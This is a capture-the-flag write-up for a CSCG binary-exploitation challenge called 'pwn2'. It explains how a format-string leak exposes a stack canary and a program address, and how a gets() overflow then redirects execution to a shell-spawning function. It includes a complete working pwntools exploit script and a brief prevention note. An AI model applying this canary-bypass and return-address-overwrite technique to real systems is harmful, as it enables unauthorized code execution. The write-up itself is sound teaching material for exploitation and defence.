# First thoughts:
The program now expects 3 user inputs. The first is just the flag from the previous challenge. After looking at the provided source code I saw that the flag checking is done safe, so no exploitation possible here. But the rest of the program is the same as pwn1. So the rest of the inputs are provided via a `gets` and all the text is printed via `printf`. So again a possible BufferOverflow because gets doesn't check the buffer size provided and writes however long the input is to the stack.  And because of the `printf ` it is feasible to use a StringFormatExploit.
The last step is to get a shell, Luckily the function `WINgardium_leviosa` is again provided which calls the shell.
With the program checksec I noticed that now there are stack canaries provided so I have to bypass them first before overwriting the return address.

# The Exploit:
## Getting the addresses we want to jump to
First I created a small python script with pwntools. The script waits for the string `Enter the password from stage 1:` and sends the flag. 
After that I first wanted to get the addresses needed for the exploit, like in Stage 1. So the script would wait for the string `Enter your witch name:`  after that the program expects a user input. So the script would send a string containing `%p` 42 times and between a `|`. Because I knew from the source that the given witch name would be printed directly with `printf`. I knew that if I send `%p` the program would leak the next 42 addresses from the stack. Now I attach gdb to the program and with the command `vmmap` I see at which address my program starts and ends. If I now compare this with the output I got from my input. I notice that the 40th value is inside my programs address space (e.g. 0x55588a175dc5). With this knowledge I can now defeat ASLR normally this randomizes the addresses at which the program and its libraries get loaded. But now I can get an address from inside the programs address space and because the methods inside the program have a constant relative address I now searches for the `WINgardium_leviosa` function and copied the address (e.g. 0x55588a175b94). So the distance between is 0x55588a175dc5-0x55588a175b94=0x231, so I know if I add 0x231 to the 40th value I get the start of the `WINgardium_leviosa` function.
We know from the first pwn challenge that we have to deal with an unaligned stack if we directly jump to this function.  To align it I just need to make a simple return in front of that. So I have to get an address to a return e.g. the return address of the  `WINgardium_leviosa` function is 0x55588a175bca and calculate the distance to the start of the `WINgardium_leviosa` function (0x55588a175b94-0x55588a175bca=0x36).

## Bypass the canary value
First I have to find out which padding I need to add to `Expelliarmus\x00` until the canary value. I create a payload for the third input with `Expelliarmus\x00` concatenated  with `cyclic(0xff)`. The `cylic` function creates a sequence of chars generated by pwntools. This sequence is special as every part can be recognized by only 4 chars. I attach gdb to the program and wait until an error is thrown because of the canary value. There gdb tells me what value was checked, it turns out to be `cnaa`. So now I know if I replace `cyclic(0xff)` by `"A"*cyclic_find("cnaa")` then the next thing overwrites the canary value. 
Now comes the tricky part I need to get the canary value. Luckily I can leak the stack by changing the payload for the second input. Previously it was `%p` 42 times and in between a `|`. But because I only need the 40th value I can send `%lx` 38 times and then 4 times `%p` with `|` in between. Because the number of formats strings hasn't changed the 40th place also hasn't changed. But now `%lx` is printed. The x is for printing values from the stack and the l says that it should print 64 bit values instead of 32 bit. 
Now the script can be executed again and I can look for the real canary value in gdb and search it in the output of the script. It is printed as the 38th value.

## Final payload
Now that I know the canary value my payload looks like this: `Expelliarmus\x00` concatenated  with `"A"*cyclic_find("cnaa")` concatenated with the canary value.
The next step is to find out where the `AAAAAA` functions return pointer is located from the canary value. So I concatenate `cyclic(0xff)` to the payload, start the script and attach gdb to the program.  Now I wait for a Segmentation Fault and notice that the program tried to jump to the address in chars `caaa`. So I now know the canary value got replaced correctly and the padding between it and the return address is `"A"*cyclic_find("caaa")`.
So I the final payload looks like this: `Expelliarmus\x00` concatenated  with `"A"*cyclic_find("cnaa")` concatenated with the canary value then `"A"*cyclic_find("caaa")` after that  the address to the return and finally the start address of the `WINgardium_leviosa` function.
At the end the script looks like this:
```
from pwn import *

p = process("./pwn2")
#p = remote("hax1.allesctf.net", 9101)

FORMATSTRING = "|".join(["%lx" for _ in xrange(0,38)])
FORMATSTRING2 = "|".join(["%p" for _ in xrange(0,4)])

MAIN_TO_WIN_OFFEST = 0x231

p.recvuntil("Enter the password of stage 1:")

p.sendline("CSCG{THIS_IS_TEST_FLAG}")
#p.sendline("CSCG{NOW_PRACTICE_MORE}")

p.recvuntil("Enter your witch name:")

raw_input("attach gdb")

p.sendline(FORMATSTRING + "|" + FORMATSTRING2)


LEAKS = p.recvuntil("enter your magic spell:").split("|")
CANARY = int(LEAKS[-4], 16)

MAIN = int(LEAKS[-2], 16)
log.info("Leaked return value 0x{:x}".format(MAIN))
log.info("Leaked CANARY value 0x{:x}".format(CANARY))

#print(LEAKS)

WIN = MAIN-MAIN_TO_WIN_OFFEST
RET = WIN+0x36

#print(p64(CANARY))

PADDING1 = "A"*cyclic_find("cnaa")
PADDING2 = "A"*cyclic_find("caaa")
p.sendline("Expelliarmus\x00" + PADDING1 + p64(CANARY) + PADDING2 + p64(RET) + p64(WIN))

p.interactive()

```
Now that I got a bash just execute `cat flag` and the flag is printed out.
To get the real flag just change the attached program to the server and change the flag to the real one from Stage 1 and execute.

# Prevention:
The problem is that the user input is not sanitized.
If the input got sanitized and a safe alternative for `gets` would be used like `fgets` then it wouldn't be possible to overwrite the return value.
